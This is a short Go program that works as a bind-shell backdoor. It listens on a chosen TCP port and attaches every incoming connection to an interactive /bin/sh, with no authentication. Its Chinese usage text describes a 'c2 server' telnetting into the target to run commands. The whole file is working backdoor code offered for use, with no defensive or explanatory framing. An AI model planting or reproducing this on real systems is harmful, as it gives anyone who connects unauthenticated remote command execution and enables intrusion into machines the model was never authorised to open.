package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
)

func handle(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp

	go io.Copy(conn, rp)

	err := cmd.Run()
	if err != nil {
		log.Println("命令执行出错：", err)
	}

	conn.Close()
}

func main() {
	var port int
	flag.IntVar(&port, "port", 0, "要监听的端口号")
	flag.IntVar(&port, "P", 0, "要监听的端口号")
	help := flag.Bool("help", false, "显示使用说明")

	flag.Parse()

	if *help {
		fmt.Println("使用说明:")
		fmt.Println("go run yourfile.go -port/-P 端口号启动监听")
		fmt.Println("c2服务器端 telnet ip port 连接目标服务器地址和端口执行命令")
		os.Exit(0)
	}

	if port == 0 {
		log.Fatal("必须指定一个端口号，使用 -port 或 -P 参数，输入参数--help查看使用说明")
	}

	address := fmt.Sprintf(":%d", port)
	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Fatalf("无法监听端口 %d: %v", port, err)
	}

	defer listener.Close()
	fmt.Printf("监听端口 %d...\n", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("连接接受错误：", err)
			continue
		}

		go handle(conn)
	}
}
